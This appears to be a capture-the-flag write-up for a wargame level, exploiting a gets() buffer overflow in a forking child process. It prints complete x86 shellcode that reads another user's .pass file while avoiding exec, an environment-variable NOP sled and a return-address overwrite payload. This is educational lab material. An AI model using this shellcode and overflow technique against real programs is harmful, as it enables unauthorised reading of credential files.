Here the code is pretty complicated, I used Ghidra to see things more clearly.

The code is forking a child process, then inside of the child it waits to user input with `gets` (which we know from before is vulnerable to buffer overflow).

I used GDB to find the offset of the return address and found that it is 156 bytes from the start of the buffer.

Only thing left now is to prepare my payload, load the program with it in the env and find the address of the NOP sled.

It is also verifying that no call to the `exec` syscall is made.

To bypass this, I will use a shellcode that does not use `exec` but instead uses libc functions to print the flag directly.

```bash
perl -e 'print "\x90"x1000 . "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"' > /tmp/payload
```

One of the addresses of the NOP sled is 0xffffdcf4. I can now prepare the exploit.

```bash
perl -e 'print "a"x156 . "\xf4\xdc\xff\xff"' > /tmp/exploit
```

Then the only thing left is to run the exploit:

```bash
cat /tmp/exploit | env -i PAYLOAD=$(cat /tmp/payload) ./level04
Give me some shellcode, k
[REDACTED FLAG]
child is exiting...
```
